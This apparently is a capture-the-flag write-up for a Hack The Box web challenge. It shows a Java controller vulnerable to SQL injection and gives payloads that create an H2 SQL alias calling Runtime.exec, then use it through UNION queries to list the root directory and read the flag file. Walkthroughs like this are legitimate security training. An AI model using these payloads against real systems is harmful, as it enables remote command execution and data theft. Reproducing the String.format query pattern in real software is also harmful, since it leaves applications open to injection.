# HTB-PentestNotes-Writeup
The challenge had a very easy vulnerability to spot, but a trickier playload to use. Let's look into it.
First of all, upon opening the web application you'll find a login screen. It could be usefoul to notice, for other challenges, that within the files that you can download there is a data.sql file which contains a pre-registered user with username "user" and password "123".
For this challenge, creating a new account is not relevant.

After the login, you'll find a page with three notes, moreover if you click on one, you'll end up to another page, **/note**, that provides more details regarding the note your clicked on.
We can also see that in the url there is the name of the required note.

Looking at the code, we stumble upon the NotesController.java file, where we can find a code snippet that allows SQL Injection: 

```java
@PostMapping("/note")
    public ResponseEntity < ? > noteByName(@RequestParam String name, HttpSession httpSession) {
        if (httpSession.getAttribute("username") == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("unauthorized");
        }
        if (name.contains("$") || name.toLowerCase().contains("concat")) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Bad character in name :)");
        }
        String query = String.format("Select * from notes where name ='%s' ", name);
        List < Object[] > resultList = entityManager.createNativeQuery(query).getResultList();
        List < Map < String, Object >> result = new ArrayList < > ();
        for (Object[] row: resultList) {
            Map < String, Object > rowMap = new HashMap < > ();
            rowMap.put("ID", row[0]);
            rowMap.put("Name", row[1]);
            rowMap.put("Note", row[2]);
            result.add(rowMap);
        }
        return ResponseEntity.ok(result);
    }
```

Using the String.format method to create queries is insecure as it allows a malicious user to inject SQL code.
Let's continue to look at the files, this time to see where the flag is located. Within the Dockerfile we can see that the flag is copied at the **/** directory, but the name has been randomized.
For this reason we will need to find a way to list the files inside said directory.

After quite a bit of research, i found that there is the possibility to execute java code through SQL aliases.
Knowing this, the idea is to create an SQL alias for the exec() function in java, that will alow us to both list the files and then to read their contents.

The first step is the creation of the alias, by piggy-backing the malicious code to the original query:

```SQL
pwn'; CREATE ALIAS EXECVE AS 'String execve(String cmd) throws java.io.IOException {java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";}';-- 
```

Remember to URL encode the request otherwise it won't work!
Great, now we have our EXECVE in the database, let's use it, the next payload would be the following:

```SQL
pwn' UNION SELECT 10, EXECVE('ls /'), NULL -- 
```

The result of said query will be this one: 

![Schermata del 2024-10-30 10-46-02](https://github.com/user-attachments/assets/9236162a-a22e-413d-a7e4-7986d3a0b2ef)

Now, the final step is to actually read the flag's content, using this payload:

```SQL
pwn' UNION SELECT 10, EXECVE('cat /<flagname>.txt'), NULL -- 
```
